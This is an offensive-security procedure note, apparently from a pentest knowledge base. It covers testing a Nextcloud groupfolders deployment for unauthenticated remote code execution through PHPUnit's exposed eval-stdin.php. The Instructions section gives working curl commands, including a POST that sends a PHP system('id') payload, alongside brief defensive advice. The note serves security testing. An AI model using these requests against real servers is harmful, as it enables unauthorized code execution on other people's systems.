---
id: proc-test-eval-stdin-access
tags:
  - rce
  - testing
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-post-test]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:23:27.790Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-Accessibility-of-eval-stdin.php

## Summary

This procedure tests whether the eval-stdin.php file is web-accessible in a Nextcloud deployment without authentication, particularly in configurations retaining index.php in URLs, to confirm RCE exposure.

## Description

In Nextcloud setups without URL rewriting, direct access to app files like vendor/phpunit/.../eval-stdin.php is possible. Sending a POST with PHP code to php://stdin can trigger execution if the server uses CGI/FastCGI. This step simulates exploitation in a controlled environment.

## Requirements

1. Deployed Nextcloud instance with groupfolders app
2. curl for HTTP requests
3. No URL rewriting enabled (e.g., .htaccess disabled)

## Defense

Defensive measures and detection strategies:

- Enable URL rewriting to hide app internals
- Implement authentication wrappers for all app paths
- Use WAF rules to block access to /vendor/ paths

## Objectives

1. Verify direct file access without auth
2. Test POST payload execution
3. Assess real-world exploitability

## Instructions

### Step 1: Attempt Direct Access

**Context**: Check if the file loads via GET in a non-rewritten URL.

**Command** (curl GET):
```bash
curl http://nextcloud.example.com/index.php/apps/groupfolders/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

> Expected output: PHP error or blank if executable, confirming accessibility.

### Step 2: Test RCE with POST

**Context**: Send malicious PHP via POST to trigger eval.

**Command** ([[commands/curl-post-test]]):
```bash
curl -X POST http://nextcloud.example.com/index.php/apps/groupfolders/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d '<?php system("id"); ?>'
```

> Expected output: Output of 'id' command if successful, e.g., uid=33(www-data).

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-post-test]]
- curl (built-in GET)

## Tools Used


## Tags

- rce
- testing
- web
